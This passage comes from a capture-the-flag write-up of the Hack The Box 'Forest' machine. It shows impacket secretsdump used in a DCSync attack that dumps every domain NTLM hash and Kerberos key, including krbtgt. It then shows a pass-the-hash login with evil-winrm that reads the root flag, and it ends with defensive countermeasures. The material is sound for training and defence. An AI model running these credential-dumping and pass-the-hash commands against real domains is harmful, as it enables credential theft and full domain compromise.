After granting the `r0kit` user domain controller replication permissions, I synched the Active Directory database (NTDS.dit) with impacket's `secretsdump.py` script to dump all NTLM hashes from it:

```none
$ python3 ~/tools/impacket/examples/secretsdump.py 'htb.local/r0kit:h4ckit!!@10.10.10.161'
Impacket v0.9.22.dev1+20200826.101917.9485b0c2 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
r0kit:7603:aad3b435b51404eeaad3b435b51404ee:3f7d540a8248c462553a90c66d40e4f3:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:804f46c942d5fd157bf69ad9cd23d050:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
r0kit:aes256-cts-hmac-sha1-96:2ab6d4382330d8f2e90e7f9d363a44ddc497f20e053aedac7d0b2dec964952bb
r0kit:aes128-cts-hmac-sha1-96:08f3aa003f9cba4acdcf65c5e701cbbb
r0kit:des-cbc-md5:ec4a5886cb43940b
FOREST$:aes256-cts-hmac-sha1-96:362e81f491974d05ed5d3188fb3dad401f766ba11c98d72e9f33730ebc85df22
FOREST$:aes128-cts-hmac-sha1-96:4a67fae3ef5a11bd5d74287a148af0ee
FOREST$:des-cbc-md5:49b3d3c86b1086a8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

After grabbing the Administrator's hash, I passed it to WinRM to login, fully compromising the host and grabbing the `root.txt` flag:

```none
kali@kali:~/htb/boxes/forest/loot$ ~/tools/evil-winrm/evil-winrm.rb -H '32693b11e6aa90eb43d32c72a07ceea6' -u Administrator -i 10.10.10.161

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2019   2:15 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> gc root.txt
f048153f202bbb2f82622b04d79129cc
```

## Countermeasures

* Don't allow anonymous users to access LDAP on the domain controller.
* Don't allow anonymous users to access NetBIOS on the domain controller.
* Implement an Active Directory account lockout policy to prevent password spraying attacks.
* Prefer enabling kerberos preauthentication for the `svc-alfresco` user. If this is not possible, use a dedicated securely random password that is strong enough to not be brute forced offline.
* Use tools like bloodhound to check for dangerous ACLs that can lead to domain admin privilege escalation.
* Remove the `writeDACL` permission for the `Exchange Windows Permissions` group. The [following script](https://github.com/gdedrouas/Exchange-AD-Privesc) should help with this.
* For future security of the system, audit and monitor ACL changes in Active Directory. You can find more instructions for this at the bottom of [this article](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/).